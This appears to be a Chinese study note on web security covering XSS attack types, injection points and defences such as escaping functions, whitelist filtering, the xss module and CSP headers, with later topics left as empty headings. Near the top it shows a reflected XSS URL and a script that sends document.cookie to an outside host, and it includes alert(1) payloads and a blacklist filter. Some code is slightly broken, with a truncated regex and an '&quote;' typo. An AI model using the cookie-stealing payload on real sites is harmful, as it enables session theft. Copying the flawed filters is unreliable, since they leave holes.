# Web 安全

## Web 安全层次
- 代码层次
- 架构层次
- 运维层次

## 安全问题
- 用户身份被盗用
- 用户密码泄露
- 用户资料被盗取
- 网站数据库泄露



## XSS：跨站脚本攻击
> Cross Site Scripting

- 获取页面数据
- 获取 Cookies
- 劫持前段逻辑
- 发送请求

### XSS攻击分类
- 反射型：URL 参数直接注入
- 存储行：存储到 DB 后读取时注入

### XSS 攻击注入点
- HTML 节点内容
- HTML 属性
- JavaScript 代码（后台用户的变量，用户输入的变量）
- 富文本


### URL 参数直接注入
- 攻击用户url 地址：
`http://domain/?from=<script src="https://domain.com/joke.js"></script>`

- 获取数据服务器- doamin.com/joke.js
`var img = document.createElement('img')
img.width = 0;
img.hegiht = 0;
img.src='http://domain.com/joke/joke.php?joke=' + encodeURIComponent(document.cookie);`

- 攻击用户 url 地址（使用短网址,dwz.cn）发给其他用户使用之后，获取数据服务器可以得到用户的cookies，并在浏览器设置获取cookies之后，获取用户数据。


### HTML 节点内容
- `<div>{{content}}</div`
- `<div><script></script></div>`

### HTML 属性
`<img src="#{image}"/>`
`<img src="1" onerror="alert(1)"/>`
- 输入的内容：`1" onerror="alert(1)`

### JavaScript 代码（后台用户的变量，用户输入的变量）
`<script>
	var data = "#{data}";
	// hello";alert(1);" 用户输入的数据
	var data = "hello";alert(1);""
</script>`



### 富文本
- 富文本得保留HTML
- HTML 有 XSS 攻击风险


### 浏览器自带防御
- Koa: `ctx.set('X-XSS-Protection', 0);`
	+ XSS 攻击打开，对 Chrome浏览器有效
	+ 仅对 **HTML内容和属性**,富文本拦截
	+ JavaScript 注入的不能拦截
	+ 默认1：打开

### 防御 HTML 节点内容
`<div>#{content}</div>`

- 显示时候转义 
`var escapeHtml = function(str){
	if(!str) return '';
	str = str.replace(/</g,'&lt;');
	str = str.replace(/>/g,'&gt;');
	return str;
}
//输出语句
write(escapeHtml(content))
`
- 输入时转义

### 防御 HTML 属性
> 因为提前关闭引号

- 输出时转义
`var escapeHtmlProperty = function(str) {
	if(!str) return '';
	str = str.replace(/"/g, "&quote;");
	str = str.replace(/'/g, "&#39;");
	str = str.replace(/ /g, "&#32;");
	return str;
}
//输出语句
write(escapeHtmlProperty(content))
`

- 合并函数
`var escapeHtml = function(str) {
	if(!str) return '';
	// html5 之前 &也需要转义
	str = str.replace(/&/g,'&amp;');
	str = str.replace(/</g,'&lt;');
	str = str.replace(/>/g,'&gt;');
	str = str.replace(/"/g, "&quote;");
	str = str.replace(/'/g, "&#39;");
	// str = str.replace(/ /g, "&#32;");
	return str;
}`

### 防御 JavaScript 代码

- 转义"\"
`var escapeForJs = function(str) {
	if(!str) return '';
	str = str.replace(/\\/g, '\\\\')
	str = str.replace(/"/g, '\\"')
	return str;
}`

- 转换成json
`JSON.Stringify(content)`


### 防御富文本
- 过滤（输入前（一次过滤）|输出前（性能问题））
	+ 黑名单
	+ 白名单（保留部分标签和属性）

- 黑名单
var xssFilter = function(html){
	if(!html) {
		return '';
	} 
	// 黑名单
	html = html.replace(/<\s*\/?script\s*>/g, '');
	html = html.replace(/javascript:[^'"]*/ig, '');
	html = html.replace(/onerror\s*=\s*['"]?[^'"]*['"]?/ig,
	return html;
}

- 另一种JavaScript
<a href="javascript:alert(1)">来接</a>

- onerror,onclick,onmouseover,onmouseout
<img src=\"abc\" onerror=\"alert(1)\">

### 推荐：白名单富文本xss
- cheerio 库
`$ cnpm install cheerio -S`
var xssFilter2 = function(html){
	if(!html) {
		return '';
	} 
	// 黑名单
	// html = html.replace(/<\s*\/?script\s*>/g, '');
	// html = html.replace(/javascript:[^'"]*/ig, '');
	// html = html.replace(/onerror\s*=\s*['"]?[^'"]*['"]?/ig, '');
	
	var cheerio = require('cheerio');
	var $ = cheerio.load(html, {
    withDomLvl1: true,
    normalizeWhitespace: false,
    xmlMode: false,
    decodeEntities: false
});
	// 白名单
	var whiteList = {
		// 'html':[''],
		// 'head':[''],
		// 'body':[''],
		'img': ['src'],
		'a': ['href']
	};
	var exclude = ['html','head','body'];

	$('*').each(function(index, elem){
		//console.log('elem before:' , elem.name);
		// 白名单过滤标签
		if(!whiteList[elem.name] && exclude.indexOf(elem.name) === -1) {
			$(elem).remove();
			//console.log('elem after:' , elem.name);
			return;
		}
				
		//console.log(elem.name,'==============', elem.attribs)
		// 白名单过滤属性
		for(var attr in elem.attribs) {			
			if(whiteList[elem.name].indexOf(attr) === -1) {
				//console.log(elem.name, attr)
				$(elem).attr(attr, null)
				//console.log(elem.name, elem.attribs)
			}
		}
		// console.log(elem)
	})
	// console.log('过滤前：', html);
	// console.log('过滤后：', $.html());
	return $.html();
	// return html;
}


### xss 模块
- cnpm install xss -S
var xssFilter = function(html){
	if(!html) {
		return '';
	}
	var xss = require('xss');
	var ret = xss(html);
	var ret = xss(html, {
		onIgnoreTag: function(){
			return '';
		}
	});
}

### CSP
> Content Security Policy
CSP全称Content Security Policy ,可以直接翻译为内容安全策略,说白了,就是为了页面内容安全而制定的一系列防护策略. 通过CSP所约束的的规责指定可信的内容来源（这里的内容可以指脚本、图片、iframe、fton、style等等可能的远程的资源）。通过CSP协定，让WEB处于一个安全的运行环境中。
- 内容安全策略
- 用于指定哪些内容可执行

有什么用?
我们知道前端有个很著名的**同源策略**,简而言之,就是说一个页面的资源只能从与之同源的服务器获取,而不允许跨域获取.这样可以避免页面被注入恶意代码,影响安全.但是这个策略是个双刃剑,挡住恶意代码的同时也限制了前端的灵活性,那有没有一种方法既可以让我们可以跨域获取资源,又能防止恶意代码呢?
答案是当然有了,这就是csp,通过csp我们可以制定一系列的策略,从而只允许我们页面向我们允许的域名发起跨域请求,而不符合我们策略的恶意攻击则被挡在门外.从而实现
需要说明的一点是,目前主流的浏览器都已支持csp.所以我们可以放心大胆的用了.

指令说明
指令就是csp中用来定义策略的基本单位,我们可以使用单个或者多个指令来组合作用,功能防护我们的网站.
指令名					demo										说明
default-src		'self' cdn.example.com	默认策略,可以应用于js文件/图片/css/ajax请求等所有访问
script-src		'self' js.example.com		定义js文件的过滤策略
style-src			'self' css.example.com	定义css文件的过滤策略
img-src				'self' img.example.com	定义图片文件的过滤策略
connect-src		'self'									定义请求连接文件的过滤策略
font-src			font.example.com				定义字体文件的过滤策略
object-src		'self'									定义页面插件的过滤策略,如 <object>, <embed> 或者<applet>等元素
media-src			media.example.com				定义媒体的过滤策略,如 HTML6的 <audio>, <video>等元素
frame-src			'self'									定义加载子frmae的策略
sandbox				allow-forms allow-scripts	沙盒模式,会阻止页面弹窗/js执行等,你可以通过添加allow-forms allow-same-origin allow-scripts allow-popups, allow-modals, allow-orientation-lock, allow-pointer-lock, allow-presentation, allow-popups-to-escape-sandbox, and allow-top-navigation 策略来放开相应的操作

report-uri		/some-report-uri

#### 指令值
所有以-src结尾的指令都可以用一下的值来定义过滤规则,多个规则之间可以用空格来隔开
值				demo									说明

*				img-src *							允许任意地址的url,但是不包括 blob: filesystem: schemes.

'none'	object-src 'none'			所有地址的咨询都不允许加载

'self'	script-src 'self'			同源策略,即允许同域名同端口下,同协议下的请求

data:		img-src 'self' data:	允许通过data来请求咨询 (比如用Base64 编码过的图片).

domain.example.com	img-src domain.example.com		允许特性的域名请求资源

*.example.com		img-src *.example.com			允许从 example.com下的任意子域名加载资源

https://cdn.com	img-src https://cdn.com		仅仅允许通过https协议来从指定域名下加载资源

https:		img-src https:		只允许通过https协议加载资源

'unsafe-inline'		script-src 'unsafe-inline'		允许行内代码执行

'unsafe-eval'			script-src 'unsafe-eval'			允许不安全的动态代码执行,比如 JavaScript的 eval()方法


#### 示例
default-src 'self';   只允许同源下的资源
script-src 'self';    只允许同源下的js
script-src 'self' www.google-analytics.com ajax.googleapis.com;		允许同源以及两个地址下的js加载
default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self';	多个资源时,后面的会覆盖前面的

 #### 服务器端配置
- Apache服务
在VirtualHost的httpd.conf文件或者.htaccess文件中加入以下代码
Header set Content-Security-Policy "default-src 'self';"

- Nginx
在 server {}对象块中添加如下代码
add_header Content-Security-Policy "default-src 'self';";

- IIS 
web.config:中添加

<system.webServer>

  <httpProtocol>

    <customHeaders>

      <add name="Content-Security-Policy" value="default-src 'self';" />

    </customHeaders>

  </httpProtocol>

</system.webServer>

#### 参考链接:
https://www.zhihu.com/question/21979782
https://content-security-policy.com/

- child-src connect-src default-src
	+ iframe
- font-src frame-src img-src
- manifest-src media-src object-src
- script-src style-src worker-src

- <host-source> <scheme-source> 'self'
- 'unsafe-inline' 'unsafe-eval' 'none'
- 'nonce-<base64-value>' <hash-source>
- 'strict-dynamic'

- MDN 网站

### PHP 中防御 XSS
- 内置函数转义
- DOM 解析白名单
- 第三方库
- CSP

#### 内置函数转义
- strip_tags($cont)
- htmlspecialchars($cont, ENT_QUOTES)
	+ &,<,>,',"
	+ 默认不转义单引号
	+ ENT_QUOTES 可以转义单引号

#### DOM 解析白名单
- PHP 5+
- DOMDocument class

#### 第三方库
- github.com

- HTML Purifier
	+ library

require_once './library/HTMLPurifier.auto.php';
$purifier = new HTMLPurifier();
$content = $purifier->purify($cont)

#### 第三方库
header('X-Xss-Protection: 0')
header("Content-Security-Policy: script-src 'self'")

<script>alert(1)</script>
<div>12323</div>
<p>param</div>
<img onerror="alert(1)"> src="test.jpg"/>


## CSRF：跨站请求伪造攻击

## 前段 Cookies 安全性

## 点击劫持攻击

## 传输安全安全问题

## 用户密码安全问题

## SQL注入攻击

## 信息泄露和社会工程学

## 其他安全问题